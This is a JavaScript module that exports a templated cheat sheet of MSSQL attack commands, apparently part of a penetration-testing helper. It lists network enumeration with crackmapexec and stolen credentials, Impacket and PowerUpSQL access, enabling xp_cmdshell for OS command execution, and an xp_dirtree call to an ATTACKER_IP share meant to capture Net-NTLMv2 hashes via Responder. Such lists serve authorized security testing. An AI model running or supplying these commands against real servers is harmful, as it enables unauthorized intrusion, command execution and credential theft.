export const mssqlCommands = {
    enumeration: [
        // Discover SQL instances on the network
        "crackmapexec mssql {{DC_IP}}/24 -u {{USERNAME}} -p '{{PASSWORD}}' -d {{DOMAIN}}",
        // Connect with Impacket
        "mssqlclient.py {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{TARGET_IP}} -windows-auth",
        // PowerUpSQL (run on Windows)
        "Import-Module PowerUpSQL; Get-SQLInstanceDomain -Verbose | Get-SQLServerInfo -Verbose"
    ],
    basicCommands: [
        "SELECT @@version;",
        "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');",
        "SELECT name FROM sys.databases WHERE state_desc = 'ONLINE';",
        "EXEC sp_linkedservers;"
    ],
    privilegeEscalation: [
        // Enable and use xp_cmdshell (requires sysadmin)
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
        "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
        "EXEC xp_cmdshell 'whoami';",
        // UNC path for Net-NTLMv2 capture via Responder
        "EXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';"
    ],
    userManagement: [
        "SELECT * FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';",
        "EXEC sp_helpsrvrolemember 'sysadmin';",
        "SELECT * FROM sys.database_principals;"
    ],
    advancedQueries: [
        "SELECT * FROM sys.dm_exec_requests;",
        "EXEC sp_who2;"
    ]
};